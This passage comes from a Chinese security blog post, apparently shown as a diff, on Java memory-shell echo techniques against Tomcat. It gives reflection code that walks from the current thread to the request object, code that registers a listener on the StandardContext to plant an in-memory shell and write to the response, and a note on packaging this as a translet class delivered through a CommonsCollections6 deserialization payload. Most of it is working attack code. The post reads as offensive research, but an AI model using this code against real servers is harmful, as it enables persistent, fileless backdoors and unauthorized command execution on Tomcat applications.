+<p>既然是广度优先搜索，我们还需要一个队列，表示有哪些需要进行搜索，还需要一个SET，set会记录哪些被搜索过了，防止被重复搜索。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> Queue&lt;location&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;location&gt;();<span class="comment">//队列保证广度优先搜索</span></span><br><span class="line"><span class="keyword">static</span> Set&lt;Object&gt; set = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;Object&gt;();<span class="comment">//set记录哪些对象被搜索过</span></span><br></pre></td></tr></table></figure>
+<p>我们再创建一个白名单</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//白名单</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">is_target</span><span class="params">(Field f,Object o)</span> <span class="keyword">throws</span> IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">b</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (                               f.get(o).getClass().isAssignableFrom(Class.forName(<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span>))</span><br><span class="line">                &amp;&amp; f.get(o).getClass().getName() !=<span class="string">&quot;java.lang.Object&quot;</span></span><br><span class="line">        )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>接下来我们设计广度优先搜索的入口：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">search</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">location</span> <span class="variable">laco</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(Thread.currentThread(), <span class="string">&quot;org.apache.tomcat.util.threads.TaskThread&quot;</span>,<span class="string">&quot;TaskThread&quot;</span>);</span><br><span class="line">        queue.offer(laco);</span><br><span class="line">        set.add(Thread.currentThread());</span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (queue.size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            basic_search.basic_search(queue.poll());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里看一下写的basic_search()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">basic_search</span><span class="params">(location lcat)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> lcat.obj;</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> lcat.path;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(lcat.clazz);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//            Class clazz = Class.forName(&quot;org.apache.tomcat.util.threads.TaskThread&quot;);</span></span><br><span class="line">            <span class="keyword">for</span> (; clazz != Object.class; clazz = clazz.getSuperclass()) &#123;</span><br><span class="line"></span><br><span class="line">                Field fields[] = clazz.getDeclaredFields();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">                    fields[i].setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">if</span> (fields[i].get(obj) == <span class="literal">null</span>)&#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!Black.isblack(fields[i].getType().getName()) &amp;&amp; fields[i].get(obj) != <span class="literal">null</span> &amp;&amp; set.add(fields[i].get(obj))) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (judge_map.is_map(fields[i].getType().getSimpleName())) &#123;</span><br><span class="line">                            <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map) fields[i].get(obj);</span><br><span class="line">                            <span class="keyword">if</span> (map.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">map_num</span> <span class="operator">=</span> <span class="number">0</span>; map_num &lt; map.size(); map_num++) &#123;</span><br><span class="line">                                    <span class="type">Object</span> <span class="variable">map_obj</span> <span class="operator">=</span> map.get(map_num);</span><br><span class="line">                                    <span class="keyword">if</span> (map_obj != <span class="literal">null</span> &amp;&amp; set.add(map_obj) &amp;&amp; !Black.isblack(map_obj.getClass().getName())) &#123;</span><br><span class="line">                                        <span class="type">location</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(map_obj, map_obj.getClass().getName(), path + <span class="string">&quot;--&gt;&quot;</span> + fields[i].getName() + <span class="string">&quot;[&quot;</span> + map_num + <span class="string">&quot;]&quot;</span>+map_obj.getClass().getName());</span><br><span class="line"><span class="comment">//                                        System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + &quot;[&quot; + map_num + &quot;]&quot;);</span></span><br><span class="line">                                        queue.offer(l);</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (judge_list.is_list(fields[i].getType().getSimpleName())) &#123;</span><br><span class="line">                            <span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> (List) fields[i].get(obj);</span><br><span class="line">                            <span class="keyword">if</span> (list.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">list_num</span> <span class="operator">=</span> <span class="number">0</span>; list_num &lt; list.size(); list_num++) &#123;</span><br><span class="line">                                    <span class="type">Object</span> <span class="variable">list_obj</span> <span class="operator">=</span> list.get(list_num);</span><br><span class="line">                                    <span class="keyword">if</span> (list_obj != <span class="literal">null</span> &amp;&amp; set.add(list_obj) &amp;&amp; !Black.isblack(list_obj.getClass().getName())) &#123;</span><br><span class="line">                                        <span class="type">location</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(list_obj, list_obj.getClass().getName(), path + <span class="string">&quot;--&gt;&quot;</span> + fields[i].getName() + <span class="string">&quot;[&quot;</span> + list_num + <span class="string">&quot;]&quot;</span>+list_obj.getClass().getName());</span><br><span class="line"><span class="comment">//                                        System.out.println(path + &quot;--&gt;&quot; + fields[i].getName() + list_obj.getClass().getName()+&quot;[&quot; + list_num + &quot;]&quot;);</span></span><br><span class="line">                                        queue.offer(l);</span><br><span class="line">                                    &#125;</span><br><span class="line"></span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span> <span class="keyword">if</span> (fields[i].getType().isArray()) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//                            Object objarr1 = fields[i].get(obj);</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">try</span> &#123;</span><br><span class="line">                                Object[] arrobj = (Object[])fields[i].get(obj);</span><br><span class="line">                                <span class="keyword">if</span> (arrobj.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">obj_num</span> <span class="operator">=</span> <span class="number">0</span>; obj_num &lt; arrobj.length; obj_num++) &#123;</span><br><span class="line">                                        <span class="type">Object</span> <span class="variable">arr_obj</span> <span class="operator">=</span> arrobj[obj_num];</span><br><span class="line">                                        <span class="keyword">if</span> (arr_obj != <span class="literal">null</span> &amp;&amp; set.add(arr_obj) &amp;&amp; !Black.isblack(arr_obj.getClass().getName())) &#123;</span><br><span class="line">                                            <span class="type">location</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(arr_obj, arr_obj.getClass().getName(), path + <span class="string">&quot;--&gt;&quot;</span> + fields[i].getName() + <span class="string">&quot;[&quot;</span> + obj_num + <span class="string">&quot;]&quot;</span>+arr_obj.getClass().getName());</span><br><span class="line"><span class="comment">//                                            System.out.println(path + &quot;--&gt;&quot; + fields[i].getClass().getName() + &quot;[&quot; + obj_num + &quot;]&quot;);</span></span><br><span class="line">                                            queue.offer(l);</span><br><span class="line">                                        &#125;</span><br><span class="line"></span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;<span class="keyword">catch</span> (Throwable e)&#123;</span><br><span class="line"><span class="comment">//                                System.out.println(fields[i].get(obj));</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                            <span class="keyword">if</span> (target.is_target(fields[i],obj)) &#123;</span><br><span class="line"></span><br><span class="line">                                System.out.println(path+<span class="string">&quot;---&gt;&quot;</span>+fields[i].getName()+<span class="string">&quot;(&quot;</span>+fields[i].get(obj).getClass().getName()+<span class="string">&quot;)&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="type">location</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">location</span>(fields[i].get(obj), fields[i].get(obj).getClass().getName(), path+<span class="string">&quot;---&gt;&quot;</span>+fields[i].getName()+<span class="string">&quot;(&quot;</span>+fields[i].get(obj).getClass().getName()+<span class="string">&quot;)&quot;</span>);</span><br><span class="line">                            search.queue.offer(l);</span><br><span class="line"><span class="comment">//                        System.out.println(path+&quot;---&gt;&quot;+fields[i].getName()+&quot;(&quot;+fields[i].get(obj).getClass().getName()+&quot;)&quot;);</span></span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>全部完整代码上传至<a target="_blank" rel="noopener" href="https://github.com/f19t/java-Object-simple-search/">https://github.com/f19t/java-Object-simple-search/</a></p>
+<p>因为我们为了让回显和写内存马更方便，我们这里只搜了RequestFacade，我们简单写一个simple去搜索一下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//simple</span></span><br><span class="line"><span class="meta">@WebServlet(&quot;/simple&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">simple</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            search.search();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>得到的输出是:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TaskThread---&gt;group(java.lang.ThreadGroup)--&gt;threads[<span class="number">14</span>]java.lang.Thread---&gt;</span><br><span class="line">target(org.apache.tomcat.util.net.NioEndpoint$Poller)---&gt;</span><br><span class="line"><span class="built_in">this</span>$<span class="number">0</span>(org.apache.tomcat.util.net.NioEndpoint)---&gt;</span><br><span class="line">handler(org.apache.coyote.AbstractProtocol$ConnectionHandler)---&gt;global(org.apache.coyote.RequestGroupInfo)--&gt;</span><br><span class="line">processors[<span class="number">0</span>]org.apache.coyote.RequestInfo---&gt;</span><br><span class="line">req(org.apache.coyote.Request)--&gt;</span><br><span class="line">notes[<span class="number">1</span>]org.apache.catalina.connector.Request---&gt;</span><br><span class="line">applicationRequest(org.apache.catalina.connector.RequestFacade)</span><br></pre></td></tr></table></figure>
+<p>这里就表明我们已经成功搜索并拿到了当前线程的RequestFacade。有了RequestFacade我们就可以拿到StandardContext,下面操作在 <strong>if (target.is_target(fields[i],obj)) {}</strong> 里面执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">RequestFacade reqfd = (RequestFacade) fields[i].get(obj);</span><br><span class="line">Field f = reqfd.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">f.setAccessible(true);//因为是protected</span><br><span class="line">Request req = (Request) f.get(reqfd);//反射获取值</span><br><span class="line">StandardContext context = (StandardContext) req.getContext();</span><br><span class="line">ServletRequestListener listener = new ServletRequestListener() &#123;&#125;;</span><br><span class="line">context.addApplicationEventListener(listener);</span><br></pre></td></tr></table></figure>
+<p>也可以拿到当前线程的response</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">RequestFacade</span> <span class="variable">reqfd</span> <span class="operator">=</span> (RequestFacade) fields[i].get(obj);</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> reqfd.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);<span class="comment">//因为是protected</span></span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) f.get(reqfd);<span class="comment">//反射获取值</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">ff</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;response&quot;</span>);</span><br><span class="line">ff.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Response</span> <span class="variable">resp</span> <span class="operator">=</span> (Response) ff.get(req);</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">out.println(<span class="string">&quot;wwwwww&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/16780849147183.jpg"></p>
+<p>我们可以很方便的把上面的代码组装成一个类，这样我们反序列化的时候可以使用加载字节码的方式执行我们的回显代码或者添加内存马。</p>
+<p>完整代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/f19t/java-Object-simple-search/blob/main/search-object/src/main/java/com/f19t/searchobject/searchobject/search_utill.java</span><br></pre></td></tr></table></figure>
+
+<h3 id="反序列化简单利用"><a href="#反序列化简单利用" class="headerlink" title="反序列化简单利用"></a>反序列化简单利用</h3><p>我们把要执行的代码放到构建的AbstractTranslet类里面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class f = Class.forName(&quot;org.hang.web_test.location&quot;);</span><br><span class="line">            Method method = f.getMethod(&quot;search&quot;);</span><br><span class="line">            method.invoke(null);</span><br></pre></td></tr></table></figure>
+
+<p>生成序列化数据，这里用的cc6反序列化执行代码。<br><img src="/2023/03/06/java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2/16780962023051.jpg"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/JAVASEC/" rel="tag"># JAVASEC</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/03/06/tomcat%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E5%86%85%E5%AD%98%E9%A9%AC/" rel="prev" title="tomcat动态注册内存马">
+      <i class="fa fa-chevron-left"></i> tomcat动态注册内存马
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#java%E5%86%85%E5%AD%98%E9%A9%AC%E5%9B%9E%E6%98%BE%E5%88%9D%E6%8E%A2"><span class="nav-number">1.</span> <span class="nav-text">java内存马回显初探</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E7%9F%A5%E8%AF%86"><span class="nav-number">1.2.</span> <span class="nav-text">准备知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%98%E5%82%A8Request%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="nav-number">1.2.1.</span> <span class="nav-text">存储Request的位置</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84%E8%8E%B7%E5%8F%96TaskThread%E9%87%8C%E9%9D%A2%E6%89%80%E6%9C%89%E5%8F%98%E9%87%8F"><span class="nav-number">1.2.2.</span> <span class="nav-text">反射获取TaskThread里面所有变量</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.</span> <span class="nav-text">反序列化简单利用</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">f19t</p>
+  <div class="site-description" itemprop="description">个人学习的一些记录。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">10</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        <!--
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">f19t</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+-->
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
